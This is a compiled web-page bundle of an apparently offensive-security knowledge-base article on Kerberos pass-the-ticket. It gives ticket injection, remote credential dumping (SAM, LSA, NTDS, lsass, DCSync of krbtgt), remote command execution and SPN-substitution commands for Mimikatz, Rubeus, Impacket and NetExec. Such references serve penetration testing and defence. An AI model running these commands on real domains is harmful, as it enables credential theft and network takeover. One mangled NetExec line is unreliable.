import{_ as r,c as k,a5 as o,G as t,w as a,j as e,a as s,B as n,o as p}from"./chunks/framework.B5CpDqM0.js";const E=JSON.parse('{"title":"Pass the ticket","description":"MITRE ATT&CK™ Sub-technique T1550.003","frontmatter":{"description":"MITRE ATT&CK™ Sub-technique T1550.003","authors":"CyrilleFranchet, ShutdownRepo, mpgn, sckdev"},"headers":[],"relativePath":"ad/movement/kerberos/ptt.md","filePath":"ad/movement/kerberos/ptt.md","lastUpdated":1724982529000}'),c={name:"ad/movement/kerberos/ptt.md"};function d(g,i,u,b,m,y){const l=n("PluginTabsTab"),h=n("PluginTabs");return p(),k("div",null,[i[6]||(i[6]=o(`<h1 id="pass-the-ticket" tabindex="-1">Pass the ticket <a class="header-anchor" href="#pass-the-ticket" aria-label="Permalink to &quot;Pass the ticket&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>There are ways to come across (<a href="./../credentials/dumping/cached-kerberos-tickets">cached Kerberos tickets</a>) or forge (<a href="./ptk">overpass the hash</a>, <a href="./forged-tickets/silver">silver ticket</a> and <a href="./forged-tickets/golden">golden ticket</a> attacks) Kerberos tickets. A ticket can then be used to authenticate to a system using Kerberos without knowing any password. This is called <a href="./ptt">Pass the ticket</a>. Another name for this is Pass the Cache (when using tickets from, or found on, UNIX-like systems).</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><div class="tip custom-block"><p class="custom-block-title">convert tickets UNIX &lt;-&gt; Windows</p><p>Using <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py" target="_blank" rel="noreferrer">ticketConverter.py</a> (from the Impacket suite, written in Python).</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Windows -&gt; UNIX</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ticketConverter.py</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $ticket</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.kirbi</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $ticket</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.ccache</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># UNIX -&gt; Windows</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ticketConverter.py</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $ticket</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.ccache</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $ticket</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.kirbi</span></span></code></pre></div></div><h3 id="injecting-the-ticket" tabindex="-1">Injecting the ticket <a class="header-anchor" href="#injecting-the-ticket" aria-label="Permalink to &quot;Injecting the ticket&quot;">​</a></h3><ul><li>On Windows systems, tools like <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noreferrer">Mimikatz</a> and <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noreferrer">Rubeus</a> inject the ticket in memory. Native Microsoft tools can then use the ticket just like usual.</li><li>On UNIX-like systems, the path to the <code>.ccache</code> ticket to use has to be referenced in the environment variable <code>KRB5CCNAME</code></li></ul>`,7)),t(h,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>i[0]||(i[0]=[e("p",null,[s("Once a ticket is obtained/created, it needs to be referenced in the "),e("code",null,"KRB5CCNAME"),s(" environment variable for it to be used by others tools.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"export"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," KRB5CCNAME"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$path_to_ticket.ccache")])])])],-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>i[1]||(i[1]=[e("p",null,[s("The most simple way of injecting the ticket is to supply the "),e("code",null,"/ptt"),s(" flag directly to the command used to request/create a ticket. Both "),e("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"mimikatz"),s(" and "),e("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),s(" accept this flag.")],-1),e("p",null,[s("This can also be done manually with "),e("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"mimikatz"),s(" using "),e("a",{href:"https://tools.thehacker.recipes/mimikatz/modules/kerberos/ptt",target:"_blank",rel:"noreferrer"},[e("code",null,"kerberos::ptt")]),s(" or "),e("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),s(".")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# use a .kirbi file")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"kerberos::ptt $ticket_kirbi_file")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# use a .ccache file")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"kerberos::ptt $ticket_ccache_file")])])])],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," ptt "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ticket:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"base64 | file.kirbi"')])])])],-1),e("p",null,[s("It is then possible to list the tickets in memory using the "),e("code",null,"klist"),s(" command.")],-1)])),_:1})]),_:1}),i[7]||(i[7]=e("h3",{id:"passing-the-ticket",tabindex:"-1"},[s("Passing the ticket "),e("a",{class:"header-anchor",href:"#passing-the-ticket","aria-label":'Permalink to "Passing the ticket"'},"​")],-1)),i[8]||(i[8]=e("ul",null,[e("li",null,"On Windows, once Kerberos tickets are injected, they can be used natively."),e("li",null,[s("On UNIX-like systems, once the "),e("code",null,"KRB5CCNAME"),s(" variable is exported, the ticket can be used by tools that support Kerberos authentication.")])],-1)),t(h,null,{default:a(()=>[t(l,{label:"Credentials dumping"},{default:a(()=>i[2]||(i[2]=[e("p",null,[s("The "),e("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s(" scripts like "),e("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py",target:"_blank",rel:"noreferrer"},"secretsdump"),s(" (Python) have the ability to remotely dump hashes and LSA secrets from a machine.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"secretsdump.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGET")])])])],-1),e("p",null,[e("a",{href:"https://github.com/Pennyw0rth/NetExec",target:"_blank",rel:"noreferrer"},"NetExec"),s(" (Python) has the ability to do it on a set of targets. The "),e("code",null,"bh_owned"),s(' has the ability to set targets as "owned" in '),e("a",{href:"https://github.com/BloodHoundAD/BloodHound",target:"_blank",rel:"noreferrer"},"BloodHound"),s(" (see "),e("a",{href:"./../credentials/dumping/sam-and-lsa-secrets"},"dumping credentials from registry hives"),s(").")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-k"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --sam")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-k"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --lsa")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexecETS"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --ntds")])])])],-1),e("p",null,[e("a",{href:"https://github.com/Hackndo/lsassy",target:"_blank",rel:"noreferrer"},"Lsassy"),s(' (Python) has the ability to do it with higher success probabilities as it offers multiple dumping methods. This tool can set targets as "owned" in '),e("a",{href:"https://github.com/BloodHoundAD/BloodHound",target:"_blank",rel:"noreferrer"},"BloodHound"),s(". It works in standalone but also as a "),e("a",{href:"https://github.com/Pennyw0rth/NetExec",target:"_blank",rel:"noreferrer"},"NetExec"),s(" module (see "),e("a",{href:"./../credentials/dumping/lsass"},"dumping credentials from lsass process memory"),s(").")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-k"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -M"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," lsassy")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-k"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -M"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," lsassy"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -o"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," BLOODHOUND=True"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," NEO4JUSER=neo4j"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," NEO4JPASS=Somepassw0rd")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"lsassy"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS")])])])],-1),e("p",null,[s("On Windows, once the ticket is injected, it will natively be used when accessing a service, for example with "),e("a",{href:"https://github.com/gentilkiwi/mimikatz",target:"_blank",rel:"noreferrer"},"Mimikatz"),s(" to extract the "),e("code",null,"krbtgt"),s(" hash with "),e("a",{href:"https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync",target:"_blank",rel:"noreferrer"},[e("code",null,"lsadump::dcsync")]),s(".")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"lsadump::dcsync"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /dc:"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DomainController "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/domain:"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/user:krbtgt")])])])],-1)])),_:1}),t(l,{label:"Command execution"},{default:a(()=>i[3]||(i[3]=[e("p",null,[s("Some "),e("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s(" scripts (Python) enable testers to execute commands on target systems with Kerberos support.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"psexec.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/USER@TARGET'")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"smbexec.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/USER@TARGET'")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"wmiexec.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/USER@TARGET'")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"atexec.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/USER@TARGET'")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dcomexec.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/USER@TARGET'")])])])],-1),e("p",null,[e("a",{href:"https://github.com/Pennyw0rth/NetExec",target:"_blank",rel:"noreferrer"},"NetExec"),s(" (Python) has the ability to do it on a set of targets")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," winrm"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-k"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -x"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," whoami")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-k"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -x"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," whoami")])])])],-1),e("p",null,[s("On Windows, legitimate tools like the "),e("a",{href:"https://docs.microsoft.com/en-us/sysinternals/",target:"_blank",rel:"noreferrer"},"sysinternals"),s(),e("a",{href:"https://docs.microsoft.com/en-us/sysinternals/downloads/psexec",target:"_blank",rel:"noreferrer"},"PsExec"),s(" ("),e("a",{href:"https://live.sysinternals.com/",target:"_blank",rel:"noreferrer"},"download"),s(") can then be used to open a cmd using that ticket.")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},".\\"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"PsExec.exe"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"accepteula \\\\$TARGET cmd")])])])],-1)])),_:1})]),_:1}),i[9]||(i[9]=e("h3",{id:"modifying-the-spn",tabindex:"-1"},[s("Modifying the SPN "),e("a",{class:"header-anchor",href:"#modifying-the-spn","aria-label":'Permalink to "Modifying the SPN"'},"​")],-1)),i[10]||(i[10]=e("p",null,"When requesting access to a service, a Service Ticket is used. It contains enough information about the user to allow the destination service to decide to grant access or not, without asking the Domain Controller. These information are stored in a protected blob inside the ST called PAC (Privilege Attribute Certificate). In theory, the user requesting access can't tamper with that PAC.",-1)),i[11]||(i[11]=e("p",null,[s("Another information stored in the ST, outside of the PAC, and unprotected, called "),e("code",null,"sname"),s(", indicates what service the ticket is destined to be used for. This information is basically the SPN (Service Principal Name) of the target service. It's split into two elements: the service class, and the hostname.")],-1)),i[12]||(i[12]=e("p",null,[s("Their are multiple service classes for multiple service types (LDAP, CIFS, HTTP and so on) (more info on "),e("a",{href:"https://adsecurity.org/?page_id=183",target:"_blank",rel:"noreferrer"},"adsecurity.org"),s("). The problem here is that since the SPN is not protected, there are scenarios (e.g. services configured for "),e("a",{href:"./delegations/constrained"},"constrained delegations"),s(") where the service class can be modified in the ticket, allowing attackers to have access to other types of services.")],-1)),t(h,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>i[4]||(i[4]=[e("p",null,[s("This technique is implemented and attempted by default in all "),e("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s(' scripts when doing pass-the-ticket (Impacket tries to change the service class to something else, and calls this "AnySPN").')],-1),e("p",null,[s("Impacket's tgssub.py script can also be used for manual manipulation of the service name value. "),e("em",null,"At the time of writing, 12th Feb. 2022,"),s(),e("a",{href:"https://github.com/SecureAuthCorp/impacket/pull/1256",target:"_blank",rel:"noreferrer"},[e("em",null,"the pull request")]),s(),e("em",null,"adding this script is pending.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"tgssub.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -in"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ticket.ccache"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -out"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," newticket.ccache"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -altservice"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "cifs/target"')])])])],-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>i[5]||(i[5]=[e("p",null,[s("With "),e("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),s(", it can be conducted by supplying the "),e("code",null,"/altservice"),s(" flag when using the "),e("code",null,"s4u"),s(" or the "),e("code",null,"tgssub"),s(" modules and the whole SPN can be changed (service class and/or hostname).")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," tgssub "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"altservice:cifs "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ticket:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"base64 | ticket.kirbi"')])])])],-1)])),_:1})]),_:1}),i[13]||(i[13]=e("h2",{id:"resources",tabindex:"-1"},[s("Resources "),e("a",{class:"header-anchor",href:"#resources","aria-label":'Permalink to "Resources"'},"​")],-1)),i[14]||(i[14]=e("p",null,[e("a",{href:"https://www.secureauth.com/blog/kerberos-delegation-spns-and-more",target:"_blank",rel:"noreferrer"},"https://www.secureauth.com/blog/kerberos-delegation-spns-and-more")],-1))])}const C=r(c,[["render",d]]);export{E as __pageData,C as default};
